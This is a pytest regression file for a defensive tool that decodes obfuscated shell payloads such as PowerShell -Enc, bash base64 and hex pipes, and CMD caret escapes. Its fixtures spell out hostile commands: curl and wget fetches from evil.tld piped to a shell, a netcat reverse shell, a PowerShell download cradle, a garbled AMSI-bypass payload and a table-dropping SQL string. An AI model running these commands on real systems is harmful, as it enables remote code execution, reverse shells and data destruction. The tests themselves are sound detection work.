"""Regression tests for shell-obfuscation decoders + corruption notice.

Covers the real payload types users report:
- PowerShell `-Enc` (any spelling incl. pwsh)
- Bash `echo <b64> | base64 -d`
- Bash `echo <hex> | xxd -r -p`
- Windows CMD caret escapes (`p^o^w^ershell`)
- Corrupted / misaligned base64 → helpful notice instead of CJK garbage
- General `strings(1)`-style extraction from noisy binary blobs
"""
from __future__ import annotations

import base64

import pytest

import cyberlab.plugins  # noqa: F401 — registers plugins
from cyberlab.engine import auto_decode


# ---------------------------------------------------------------------------
# Bash / *nix shell payloads
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("cmd,expect", [
    (f"echo '{base64.b64encode(b'curl http://evil.tld/x.sh|sh').decode()}' | base64 -d | bash", "evil.tld"),
    (f"echo {base64.b64encode(b'wget http://evil.tld/y').decode()} | base64 --decode", "evil.tld"),
    (f"echo '{base64.b64encode(b'nc -e /bin/sh 1.2.3.4 4444').decode()}' | openssl enc -d -base64", "/bin/sh"),
])
def test_bash_base64_pipe_extractor(cmd, expect):
    out, trace = auto_decode(cmd, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert "extract-bash-base64-pipe" in step_ids
    assert expect in text, f"trace={step_ids} final={text[:200]!r}"


def test_bash_hex_pipe_extractor():
    hex_blob = b"cmd /c whoami > out.txt".hex()
    payload = f"echo '{hex_blob}' | xxd -r -p"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "extract-bash-hex-pipe" in step_ids
    assert "whoami" in out.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Windows CMD caret escapes
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("cmd,expect", [
    ("c^m^d /c w^h^o^a^m^i > out.txt", "whoami"),
    (f"p^o^w^e^r^shell.exe -e^n^c {base64.b64encode(b'Hello').decode()}", "Hello"),
])
def test_cmd_caret_strip(cmd, expect):
    out, trace = auto_decode(cmd, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "cmd-strip-carets" in step_ids
    assert expect.lower() in out.decode("utf-8", errors="replace").lower(), (
        f"trace={step_ids} final={out[:200]!r}"
    )


def test_cmd_caret_ignores_bit_shift_operators():
    # Ensure we don't strip carets that AREN'T intra-token escapes.
    # (Python has `^` for XOR but CMD carets are only escapes.) A plain
    # sentence containing "3^2" or single caret should not trigger.
    out, trace = auto_decode("value 3^2 equals 9", max_depth=4)
    step_ids = [s.id for s in trace]
    assert "cmd-strip-carets" not in step_ids


# ---------------------------------------------------------------------------
# Short PowerShell -Enc payload (single b64 block)
# ---------------------------------------------------------------------------
def test_short_ps_enc_chains_to_base64():
    """Ensure `-enc <8-char-b64>` still fully decodes (used to fail because
    of a 16-char minimum on the PS extractor regex + base64 detect)."""
    payload = f"powershell.exe -enc {base64.b64encode(b'Hello').decode()}"
    out, trace = auto_decode(payload, max_depth=6)
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids
    assert "base64-decode" in step_ids
    assert "Hello" in out.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Corruption notice — user-reported AMSI bypass with misaligned base64
# ---------------------------------------------------------------------------
CORRUPTED_AMSI_PAYLOAD = (
    "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc combAaAQBuAGUAZAAg"
    "AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAgACcAUwB5"
    "AHMAdABlAG0ALgBNAEEAbgBhAGcAZQBtAGUAbgB0AC4QQB1AHQAbwBtAGEAdABpAG8AbgAu"
    "AEEAbQBzAGAAKAVQB0AGkAbABzAC4AJwArACcAUwB5AHMAdABlAG0ALgBNAEEAbgBhAGcA"
    "ZQBtAGUAbgB0AA=="
)


def test_corrupted_payload_surfaces_notice_not_garbage():
    """When decoded output is majority non-printable and has no readable
    UTF-16LE/ASCII runs, the engine must surface a helpful diagnostic
    (not dump CJK glyphs to the analyst)."""
    out, trace = auto_decode(CORRUPTED_AMSI_PAYLOAD, max_depth=8)
    text = out.decode("utf-8", errors="replace")
    assert "NivX Forge notice" in text, f"final={text[:300]!r}"
    assert "hex" in text.lower()  # notice includes hex dump of raw bytes
    # And the trace should show that we DID try to decode.
    step_ids = [s.id for s in trace]
    assert "extract-powershell-encoded" in step_ids
    assert "base64-decode" in step_ids


def test_clean_payloads_do_not_trigger_notice():
    """A payload that decodes cleanly must NOT get the notice appended."""
    payload = (
        "powershell -enc "
        + base64.b64encode(
            "IEX (New-Object Net.WebClient).DownloadString('http://x.tld/a.ps1')".encode("utf-16le")
        ).decode()
    )
    out, _ = auto_decode(payload, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    assert "NivX Forge notice" not in text
    assert "DownloadString" in text


# ---------------------------------------------------------------------------
# Strings extractor
# ---------------------------------------------------------------------------
def test_strings_extractor_recovers_utf16le_from_noisy_blob():
    """A binary blob with junk bytes + embedded UTF-16LE strings should
    yield the readable strings via the strings extractor."""
    from cyberlab.plugins.decoders import _extract_strings

    # Craft: 8 bytes of junk + "C:\\evil.exe" in UTF-16LE + 8 bytes of null padding
    embedded = "C:\\evil.exe".encode("utf-16le")
    junk_prefix = bytes.fromhex("de ad be ef ca fe ba be")
    blob = junk_prefix + embedded + b"\x00" * 8

    out = _extract_strings(blob, {})
    assert "C:\\evil.exe" in out.decode("utf-8", errors="replace")


def test_strings_extractor_recovers_ascii_from_binary():
    from cyberlab.plugins.decoders import _extract_strings

    blob = bytes([0xff, 0x00, 0x99, 0x88]) + b"drop table users; --" + bytes([0x11, 0x22, 0xaa])
    out = _extract_strings(blob, {})
    assert "drop table users" in out.decode("utf-8", errors="replace")
